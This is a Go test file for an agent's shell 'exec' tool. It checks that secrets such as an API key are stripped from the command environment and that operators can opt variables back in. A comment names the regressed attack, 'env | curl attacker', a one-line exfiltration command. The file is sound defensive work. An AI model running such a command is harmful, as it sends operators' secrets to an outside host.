package tools

import (
	"context"
	"strings"
	"testing"
)

// TestExecDoesNotLeakSecretsToShell verifies the exec tool strips secret-like
// environment variables from the shell command's environment. Regression test
// for P2-2 (env exfiltration via `env | curl attacker`).
func TestExecDoesNotLeakSecretsToShell(t *testing.T) {
	// A secret the server process holds but must not expose to shell commands.
	t.Setenv("ANTHROPIC_API_KEY", "super-secret-key")
	// A benign variable the command legitimately needs.
	t.Setenv("PATH", "/usr/bin:/bin")

	tl := NewTools(WithSandbox(t.TempDir()))
	tl.RegisterBuiltins()

	out, err := tl.Execute(context.Background(), "exec", map[string]any{"command": "env"})
	if err != nil {
		t.Fatalf("exec env: %v (out=%s)", err, out)
	}

	if strings.Contains(out, "super-secret-key") {
		t.Errorf("exec leaked ANTHROPIC_API_KEY to the shell environment:\n%s", out)
	}
	// PATH must still be available so builds/tools work.
	if !strings.Contains(out, "PATH=") {
		t.Errorf("exec did not pass through PATH; command environment: %s", out)
	}
}

// TestExecEnvPassthroughOptIn verifies operators can opt specific variables
// back in via VEGA_EXEC_ENV_PASSTHROUGH.
func TestExecEnvPassthroughOptIn(t *testing.T) {
	t.Setenv("MY_CUSTOM_TOKEN", "value123")
	t.Setenv("VEGA_EXEC_ENV_PASSTHROUGH", "MY_CUSTOM_TOKEN")
	t.Setenv("PATH", "/usr/bin:/bin")

	tl := NewTools(WithSandbox(t.TempDir()))
	tl.RegisterBuiltins()

	out, err := tl.Execute(context.Background(), "exec", map[string]any{"command": "env"})
	if err != nil {
		t.Fatalf("exec env: %v", err)
	}
	if !strings.Contains(out, "value123") {
		t.Errorf("opted-in var MY_CUSTOM_TOKEN was not passed through:\n%s", out)
	}
}
